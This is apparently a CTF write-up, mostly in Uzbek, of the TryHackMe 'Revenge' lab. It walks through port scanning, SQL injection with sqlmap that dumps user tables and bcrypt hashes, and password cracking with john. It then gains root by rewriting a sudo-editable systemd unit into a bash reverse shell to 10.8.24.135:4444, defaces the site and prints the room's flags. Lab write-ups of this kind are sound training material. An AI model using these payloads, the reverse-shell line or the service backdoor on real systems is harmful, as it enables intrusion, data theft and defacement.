# Revenge

Link: https://tryhackme.com/room/revenge

## Razvetka

### Portscanning:

```
╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.113.99 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.113.99:22
Open 10.10.113.99:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.113.99
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 18:56 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 18:56
Scanning 10.10.113.99 [2 ports]
Completed Ping Scan at 18:56, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:56
Completed Parallel DNS resolution of 1 host. at 18:56, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:56
Scanning 10.10.113.99 [2 ports]
Discovered open port 80/tcp on 10.10.113.99
Discovered open port 22/tcp on 10.10.113.99
Completed Connect Scan at 18:56, 0.23s elapsed (2 total ports)
Initiating Service scan at 18:56
Scanning 2 services on 10.10.113.99
Completed Service scan at 18:56, 6.54s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.113.99.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:56
Completed NSE at 18:56, 1.03s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:56
Completed NSE at 18:56, 0.95s elapsed
Nmap scan report for 10.10.113.99
Host is up, received conn-refused (0.26s latency).
Scanned at 2025-06-25 18:56:01 +05 for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds
```

Sayt tuzulmasi:

```
mete@sec ~ [1]> gobuster dir -u http://10.10.113.99/ -w /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .py,.php,.js,.sql,.txt,.html,.css
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.113.99/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,php,js,sql,txt,html,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 8541]
/contact              (Status: 200) [Size: 6906]
/products             (Status: 200) [Size: 7254]
/login                (Status: 200) [Size: 4980]
/admin                (Status: 200) [Size: 4983]
/static               (Status: 301) [Size: 194] [--> http://10.10.113.99/static/]
/app.py               (Status: 200) [Size: 2371]
```

app.py ga nazar solamiz.

## Analyz

```
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)


```

Ushbu routingda SQLi zaifligi bor.

## Web Hacking

SQLi (SqlMap):

```
╭─mete   󰉖 ~
╰─ ❯❯ sqlmap -u "http://10.10.113.99/products/1" --batch --level=5 --risk=3 --technique=BEUSTQ --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:09:09 /2025-06-25/

[19:09:09] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:09:09] [INFO] resuming back-end DBMS 'mysql' 
[19:09:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.113.99/products/1 AND 2087=2087

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.113.99/products/1 AND (SELECT 2219 FROM (SELECT(SLEEP(5)))IFBv)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.113.99/products/-1790 UNION ALL SELECT 15,15,CONCAT(0x71787a6271,0x5766434e7a49724f44796c6e747a6a495743487055737371655458615a6864766b77526b76567a64,0x7162767871),15,15,15,15,15-- -
---
[19:09:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[19:09:10] [INFO] fetching database names
available databases [5]:
[*] duckyinc
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

Yaxshi. **duckyinc** database bor.



```
╭─mete   󰉖 ~
╰─ ❯❯ sqlmap -u "http://10.10.113.99/products/1" --batch --level=5 --risk=3 --technique=BEUSTQ -D duckyinc --tables 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:09:38 /2025-06-25/

[19:09:38] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:09:38] [INFO] resuming back-end DBMS 'mysql' 
[19:09:38] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.113.99/products/1 AND 2087=2087

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.113.99/products/1 AND (SELECT 2219 FROM (SELECT(SLEEP(5)))IFBv)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.113.99/products/-1790 UNION ALL SELECT 15,15,CONCAT(0x71787a6271,0x5766434e7a49724f44796c6e747a6a495743487055737371655458615a6864766b77526b76567a64,0x7162767871),15,15,15,15,15-- -
---
[19:09:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[19:09:38] [INFO] fetching tables for database: 'duckyinc'
Database: duckyinc
[3 tables]
+-------------+
| system_user |
| user        |
| product     |
+-------------+
```



Table bor)

```

╭─mete   󰉖 ~
╰─ ❯❯ sqlmap -u "http://10.10.113.99/products/1" --batch --level=5 --risk=3 --technique=BEUSTQ -D duckyinc -T user --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:10:02 /2025-06-25/

[19:10:02] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:10:02] [INFO] resuming back-end DBMS 'mysql' 
[19:10:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.113.99/products/1 AND 2087=2087

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.113.99/products/1 AND (SELECT 2219 FROM (SELECT(SLEEP(5)))IFBv)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.113.99/products/-1790 UNION ALL SELECT 15,15,CONCAT(0x71787a6271,0x5766434e7a49724f44796c6e747a6a495743487055737371655458615a6864766b77526b76567a64,0x7162767871),15,15,15,15,15-- -
---
[19:10:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[19:10:02] [INFO] fetching columns for table 'user' in database 'duckyinc'
[19:10:03] [INFO] fetching entries for table 'user' in database 'duckyinc'
Database: duckyinc
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+

[19:10:03] [INFO] table 'duckyinc.`user`' dumped to CSV file '/home/mete/.local/share/sqlmap/output/10.10.113.99/dump/duckyinc/user.csv'
[19:10:03] [INFO] fetched data logged to text files under '/home/mete/.local/share/sqlmap/output/10.10.113.99'

[*] ending @ 19:10:03 /2025-06-25/
```

1-flag topildi.

Endi system_user **DB**siga nazar solamiz

```
╭─mete   󰉖 ~
╰─ ❯❯ sqlmap -u "http://10.10.113.99/products/1" --batch --level=5 --risk=3 --technique=BEUSTQ -D duckyinc -T system_user --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.4#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:15:30 /2025-06-25/

[19:15:30] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:15:30] [INFO] resuming back-end DBMS 'mysql' 
[19:15:30] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.113.99/products/1 AND 2087=2087

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.113.99/products/1 AND (SELECT 2219 FROM (SELECT(SLEEP(5)))IFBv)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.113.99/products/-1790 UNION ALL SELECT 15,15,CONCAT(0x71787a6271,0x5766434e7a49724f44796c6e747a6a495743487055737371655458615a6864766b77526b76567a64,0x7162767871),15,15,15,15,15-- -
---
[19:15:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[19:15:30] [INFO] fetching columns for table 'system_user' in database 'duckyinc'
[19:15:30] [INFO] fetching entries for table 'system_user' in database 'duckyinc'
Database: duckyinc
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+

[19:15:31] [INFO] table 'duckyinc.`system_user`' dumped to CSV file '/home/mete/.local/share/sqlmap/output/10.10.113.99/dump/duckyinc/system_user.csv'
[19:15:31] [INFO] fetched data logged to text files under '/home/mete/.local/share/sqlmap/output/10.10.113.99'

[*] ending @ 19:15:31 /2025-06-25/
```

## Hash Craking

server-admin'ning parolini topamiz bizda uni hashi bor.

```
╭─mete   󰉖 ~/THM/THM-LABS/2506-2025
╰─ ❯❯ john hash -w=/usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
inuyasha         (?)
1g 0:00:00:00 DONE (2025-06-25 19:17) 3.846g/s 1246p/s 1246c/s 1246C/s hellokitty..sweet
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Parol: inuyasha

Parolni veb sayt admin paneliga sinab ko'rdim biroq foyda bo'lmadi. SSH uchun bosvordim)

flag2.txt'ni qo'lga kiritdik:

```
server-admin@duckyinc:~$ cat flag2.txt 
thm{4lm0st_th3re}
```

## Privilage Escalation

server-admin foydalanuvchisining imkoniyatlari:

```
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
        /etc/systemd/system/duckyinc.service
      
```

Keling bu service faylni tahrirlaymiz:

```
sudoedit /etc/systemd/system/duckyinc.service
```

Keyin esa servis harakatini o'zimizga moslaymiz.

```
[Unit]
Description=Backdoor root shell

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.24.135/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

Reload qilamiz:

```
sudo /bin/systemctl daemon-reload
```

Keyin:

```
sudo /bin/systemctl restart duckyinc.service
```

Va nihoyat:

```
mete@sec ~> nc -nvln 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.113.99 57250
bash: cannot set terminal process group (10241): Inappropriate ioctl for device
bash: no job control in this shell
root@duckyinc:/#
```

Endi saytni defaced ko'rinishiga o'tkazamiz va 3-flagni olamiz:

```
root@duckyinc:/var/www/duckyinc# ls
ls
app.py
__pycache__
requirements.txt
static
templates
root@duckyinc:/var/www/duckyinc# cd templates
cd templates
root@duckyinc:/var/www/duckyinc/templates# ls
ls
404.html
500.html
admin.html
base.html
contact.html
index.html
login.html
product.html
products.html
root@duckyinc:/var/www/duckyinc/templates# echo "DEFACED" > index.html
echo "DEFACED" > index.html
root@duckyinc:/var/www/duckyinc/templates# ls /root
ls /root
flag3.txt
root@duckyinc:/var/www/duckyinc/templates# cat /root/flag3.txt
cat /root/flag3.txt
thm{m1ss10n_acc0mpl1sh3d}
```



# Nafas olar ekanman, davom etaman...